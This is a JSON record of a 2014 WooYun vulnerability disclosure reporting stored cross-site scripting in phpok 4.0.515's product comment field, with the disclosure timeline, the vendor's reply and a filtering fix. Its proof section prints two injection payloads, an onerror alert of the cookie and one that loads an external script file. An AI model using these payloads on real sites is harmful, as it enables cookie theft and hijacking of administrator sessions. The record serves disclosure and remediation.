{"id": 54990, "wybug_id": "wooyun-2014-062494", "wybug_title": "phpok存储型跨站", "wybug_corp": "phpok.com", "wybug_author": "dilcon", "wybug_date": "2014-05-27 11:47", "wybug_open_date": "2014-08-25 11:48", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向公众公开  简要描述： phpok4.0.515过滤不严格，导致存储型跨站产生，利用此漏洞我们可以盗取用户cookie(包括管理员)、钓鱼，修改用户信息等等。 详细说明：  phpok4.0.515在产品展示模块的商品评论处没有对用户评论进行过滤，导致存储型XSS漏洞。   漏洞证明：  官方下载地址：http://www.phpok.com/phpok.html测试浏览器：测试浏览器：IE10、Firefox29.0.1、Chrome33.0.1750.149 m1、在用户评论处输入以下内容，<img src=x onerror=alert(documnet.cookie)>\n\n2、其他用户查看商品信息时或用户评论时，漏洞触发\n\n3、管理员登录系统，审核用户评论时，漏洞触发\n\n4、使用Firebug查看页面源代码：\n\n5、修改利用利用代码为<img src=x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/eXploit.js';d.body.appendChild(e);//\">加载本地脚本\n\n6、使用Firebug查看源代码：\n\n成功加载本地脚本，通过修改本地脚本代码，我们可以对系统进行更严格的破坏   修复方案：  对用户评论内容进行严格过滤，禁止插入事件属性   版权声明：转载请注明来源 dilcon@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-05-27 17:27 厂商回复： 您好，感谢您的意见，我们这边就安排人员处理这个问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}